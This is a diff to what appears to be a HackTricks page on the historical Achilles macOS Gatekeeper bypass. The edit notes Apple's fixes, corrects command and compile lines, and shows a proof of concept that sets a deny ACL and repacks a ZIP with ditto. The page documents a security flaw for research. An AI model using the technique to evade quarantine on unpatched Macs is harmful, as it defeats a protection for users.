@@ -2,14 +2,18 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-The following proof of concept recreates the AppleDouble/ACL technique used by the Achilles Gatekeeper bypass research: it serializes an ACL as an extended attribute, preserves it in an AppleDouble file, renames the attribute to `com.apple.acl.text`, and rebuilds the ZIP archive with `ditto`.<sup>[[1]](#references)[[2]](#references)</sup>
+This historical proof of concept recreates the AppleDouble/ACL technique used by the Achilles Gatekeeper bypass research. It serializes an ACL, stores it in an AppleDouble sidecar, renames the attribute to `com.apple.acl.text`, and repacks the ZIP.<sup>[[1]](#references)[[2]](#references)</sup>
+
+Apple fixed the Gatekeeper bypass in macOS Ventura 13, Monterey 12.6.2, and Big Sur 11.7.2; restoring an ACL on a current Mac does not demonstrate a working Gatekeeper bypass.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+
+For the quarantine and first-launch checks, see [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
 
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
 chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
-./get_acls test
-ACL for test:
+./get_acls /tmp/test
+ACL for /tmp/test:
 !#acl 1
 group:ABCDEFAB-CDEF-ABCD-EFAB-CDEF0000000C:everyone:12:deny:write,writeattr,writeextattr,writesecurity,chown
 
@@ -21,7 +25,7 @@ ACL in hex: \x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43
 <summary>Code of get_acls</summary>
 
 ```c
-// gcc -o get_acls get_acls
+// clang -o get_acls get_acls.c
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/acl.h>
@@ -176,14 +180,20 @@ rm ._*
 ```
 
 ```bash
-# Check if it worked
+# Check whether the AppleDouble ACL was restored; an ACL is not itself a normal xattr
 ditto -x -k --rsrc protected.zip .
-xattr -l protected
+ls -lde protected
+# A local ditto extraction alone does not test browser/Archive Utility quarantine propagation
+xattr -p com.apple.quarantine protected
 ```
+
+
 
 ## References
 
 - [1] [Microsoft Security Blog — Gatekeeper's Achilles heel: Unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
 - [2] [Apple Developer — Packaging Mac software for distribution with `ditto`](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
-
+- [3] [Apple Support — About the security content of macOS Ventura 13](https://support.apple.com/en-ae/102853)
+- [4] [Apple Support — About the security content of macOS Monterey 12.6.2](https://support.apple.com/en-ae/102806)
+- [5] [Apple Support — About the security content of macOS Big Sur 11.7.2](https://support.apple.com/en-us/102785)
 {{#include ../../../../banners/hacktricks-training.md}}
